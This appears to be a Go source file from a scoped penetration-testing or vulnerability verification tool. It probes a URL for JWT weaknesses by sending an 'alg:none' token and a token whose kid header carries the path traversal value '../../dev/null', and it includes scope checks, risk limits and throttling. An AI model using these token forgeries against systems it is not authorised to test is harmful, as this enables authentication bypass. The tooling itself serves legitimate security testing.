package verify

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/srank/ensphere/internal/evidence"
)

// JWTConfig holds configuration for JWT manipulation verification.
type JWTConfig struct {
	URL       string
	Token     string // valid JWT
	Technique string // alg_none | kid_injection
	Method    string
	ProbeConfig
}

var validJWTTechniques = map[string]bool{
	"alg_none": true, "kid_injection": true,
}

// VerifyJWT runs the JWT manipulation verification probe.
func VerifyJWT(cfg JWTConfig) (*ProbeResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	if err := CheckMaxRisk(2, cfg.MaxRisk); err != nil {
		return nil, err
	}

	if !validJWTTechniques[cfg.Technique] {
		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: alg_none, kid_injection", cfg.Technique)}
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	probeCount := 0

	// Baseline: send with valid token
	baselineHeaders := make(map[string]string)
	for k, v := range cfg.Headers {
		baselineHeaders[k] = v
	}
	baselineHeaders["Authorization"] = "Bearer " + cfg.Token

	throttle.Wait()
	probeCount++
	baselineResp := HTTPProbe(cfg.Method, cfg.URL, "", baselineHeaders, cfg.TimeoutSec, cfg.InScope)
	if baselineResp.Error != nil {
		return nil, fmt.Errorf("baseline probe: %w", baselineResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[BASELINE] status=%d len=%d\n", baselineResp.StatusCode, len(baselineResp.Body))
	writeEvidence(ew, "jwt", cfg.Technique, cfg.URL, "", baselineResp.StatusCode,
		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "valid token")

	var modifiedToken string
	var payloadUsed string
	var err error

	switch cfg.Technique {
	case "alg_none":
		modifiedToken, err = buildAlgNoneJWT(cfg.Token)
		if err != nil {
			return nil, fmt.Errorf("build alg:none JWT: %w", err)
		}
		payloadUsed = "alg:none, signature stripped"

	case "kid_injection":
		modifiedToken, err = buildKidInjectionJWT(cfg.Token)
		if err != nil {
			return nil, fmt.Errorf("build kid injection JWT: %w", err)
		}
		payloadUsed = "kid:../../dev/null"
	}

	probeHeaders := make(map[string]string)
	for k, v := range cfg.Headers {
		probeHeaders[k] = v
	}
	probeHeaders["Authorization"] = "Bearer " + modifiedToken

	throttle.Wait()
	probeCount++
	probeResp := HTTPProbe(cfg.Method, cfg.URL, "", probeHeaders, cfg.TimeoutSec, cfg.InScope)
	if probeResp.Error != nil {
		return nil, fmt.Errorf("jwt probe: %w", probeResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[PROBE] status=%d len=%d technique=%s\n", probeResp.StatusCode, len(probeResp.Body), cfg.Technique)
	writeEvidence(ew, "jwt", cfg.Technique, cfg.URL, "", probeResp.StatusCode,
		fmt.Sprintf("%dms", probeResp.ElapsedMs), "probe", fmt.Sprintf("technique=%s", cfg.Technique))

	// Redact modified token for output (show first 20 chars)
	redactedToken := modifiedToken
	if len(redactedToken) > 20 {
		redactedToken = redactedToken[:20] + "...[REDACTED]"
	}

	baseline := RoundResult{
		StatusCode: baselineResp.StatusCode,
		ElapsedMs:  baselineResp.ElapsedMs,
		BodyHash:   baselineResp.BodyHash,
		BodyLength: len(baselineResp.Body),
	}
	probe := RoundResult{
		StatusCode: probeResp.StatusCode,
		ElapsedMs:  probeResp.ElapsedMs,
		BodyHash:   probeResp.BodyHash,
		BodyLength: len(probeResp.Body),
	}

	return &ProbeResult{
		VulnType:   "jwt",
		Technique:  cfg.Technique,
		StartedAt:  timer.StartedAt(),
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
		Measurements: JWTMeasurements{
			Technique:       cfg.Technique,
			Baseline:        baseline,
			Probe:           probe,
			BodyLengthDelta: len(probeResp.Body) - len(baselineResp.Body),
			ModifiedToken:   redactedToken,
			PayloadUsed:     payloadUsed,
		},
	}, nil
}

// buildKidInjectionJWT modifies the JWT kid header to inject a path traversal value.
func buildKidInjectionJWT(token string) (string, error) {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT: expected 3 parts, got %d", len(parts))
	}

	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("decode JWT header: %w", err)
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return "", fmt.Errorf("parse JWT header: %w", err)
	}

	header["kid"] = "../../dev/null"

	newHeaderBytes, err := json.Marshal(header)
	if err != nil {
		return "", fmt.Errorf("marshal JWT header: %w", err)
	}

	newHeader := base64.RawURLEncoding.EncodeToString(newHeaderBytes)
	return newHeader + "." + parts[1] + "." + parts[2], nil
}
